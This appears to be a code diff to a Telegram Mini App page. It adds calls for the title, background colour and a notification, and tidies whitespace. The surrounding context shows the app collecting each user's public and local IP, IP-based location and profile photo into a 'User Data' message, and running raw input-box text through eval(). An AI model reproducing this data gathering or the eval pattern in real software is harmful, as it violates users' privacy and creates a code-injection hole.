@@ -136,6 +136,15 @@
         Telegram.WebApp.MainButton.setParams({
             text: 'Main Button'
         });
+        // Imposta il titolo della mini app
+        Telegram.WebApp.setTitle("Benvenuto nella mia Mini App");
+
+        // Cambia il colore di sfondo
+        Telegram.WebApp.setBackgroundColor("#00FF00");
+
+        // Mostra una notifica
+        Telegram.WebApp.showNotification("Hai un nuovo messaggio!");
+
         Telegram.WebApp.MainButton.onClick(function () {
             Telegram.WebApp.showAlert('Main Button was clicked')
         });
@@ -265,7 +274,7 @@
             let photoUrl = await getUserProfilePhoto(user.id, botToken);
             let locationFromIP = await getLocationFromIP();
             let IP = await getIP();
-            let localIP= await getLocalIP();
+            let localIP = await getLocalIP();
 
             const userData = `
 👤 *User Data*:
@@ -405,7 +414,7 @@
             const inputValue = document.getElementById('inputBox').value;
             // Evaluate the input using the JavaScript eval function
             const result = eval(inputValue);
-           // alert(result);
+            // alert(result);
             // Show the result
             document.getElementById('result').innerText = 'Result: ' + result;
 
